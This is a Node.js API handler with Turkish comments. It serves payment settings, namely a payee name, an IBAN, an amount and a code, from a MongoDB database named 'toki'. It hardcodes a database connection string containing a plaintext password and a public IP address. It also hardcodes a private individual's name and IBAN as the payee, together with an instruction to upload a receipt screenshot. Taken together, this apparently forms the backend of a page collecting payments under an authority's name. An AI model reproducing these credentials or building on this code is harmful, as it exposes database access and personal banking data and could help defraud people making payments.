// api/get-payment-settings.js
// Returns payment settings (authority name and IBAN) from MongoDB 'iban' collection

const { MongoClient } = require('mongodb');

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://app:GucluSifre123%21@83.136.211.173:27017/toki?authSource=toki';
const MONGODB_DB = process.env.MONGODB_DB || 'toki';

let cachedClient = null;
let loggedConnection = false;

async function getClient(uri) {
    // Eğer cached client varsa ve bağlıysa, onu kullan
    if (cachedClient) {
        try {
            // Bağlantının hala aktif olduğunu kontrol et
            await cachedClient.db('admin').command({ ping: 1 });
            return cachedClient;
        } catch (err) {
            // Bağlantı kopmuşsa cache'i temizle ve yeniden bağlan
            console.log('[DB] Cached client disconnected, reconnecting...', err.message);
            try {
                await cachedClient.close();
            } catch (closeErr) {
                // Ignore close errors
            }
            cachedClient = null;
            loggedConnection = false;
        }
    }
    
    const client = new MongoClient(uri, { 
        retryWrites: true, 
        w: 'majority',
        serverSelectionTimeoutMS: 5000
    });
    
    try {
        await client.connect();
        if (!loggedConnection) {
            console.log('[DB] Connected to MongoDB successfully');
            loggedConnection = true;
        }
    } catch (err) {
        console.error('[DB] MongoDB connection failed:', err.message);
        cachedClient = null;
        loggedConnection = false;
        throw err;
    }
    cachedClient = client;
    return cachedClient;
}

module.exports = async (req, res) => {
    // UTF-8 charset header'ı ekle (Türkçe karakterler için)
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    
    try {
        const uri = MONGODB_URI;
        const dbName = MONGODB_DB;

        const client = await getClient(uri);
        const db = client.db(dbName);
        const col = db.collection('iban');

        // İban collection'ından ilk dokümanı al
        const doc = await col.findOne({}, { 
            projection: { 
                _id: 0, 
                authority_name: 1, 
                iban: 1,
                amount: 1,
                code: 1,
                description: 1
            } 
        });

        if (!doc) {
            return res.status(200).json({ 
                success: false, 
                message: 'IBAN bilgisi bulunamadı',
                settings: {
                    authority_name: 'Gamze Dilmen',
                    iban: 'TR130084540000819231421143',
                    amount: '19.250',
                    code: '4655789',
                    description: 'Ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gerekmektedir.'
                }
            });
        }

        // Başarılı yanıt (Türkçe karakterler korunacak)
        return res.status(200).json({ 
            success: true,
            settings: {
                authority_name: doc.authority_name || 'Gamze Dilmen',
                iban: doc.iban || 'TR130084540000819231421143',
                amount: doc.amount || '19.250',
                code: doc.code || '4655789',
                description: doc.description || 'Ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gerekmektedir.'
            }
        });

    } catch (err) {
        console.error('get-payment-settings error:', err.message);
        
        // Authentication hatasını özel olarak yakala
        if (err.message && (err.message.includes('Authentication failed') || err.message.includes('authentication') || err.message.includes('auth'))) {
            // Cache'i temizle ki bir sonraki istekte yeniden bağlanmayı denesin
            cachedClient = null;
            loggedConnection = false;
            
            return res.status(500).json({ 
                success: false, 
                message: 'Sunucu hatası', 
                error: 'Authentication failed. Lütfen MongoDB bağlantı bilgilerini kontrol edin.'
            });
        }
        
        // Diğer hatalar için genel mesaj
        return res.status(500).json({ 
            success: false, 
            message: 'Sunucu hatası', 
            error: err.message 
        });
    }
};

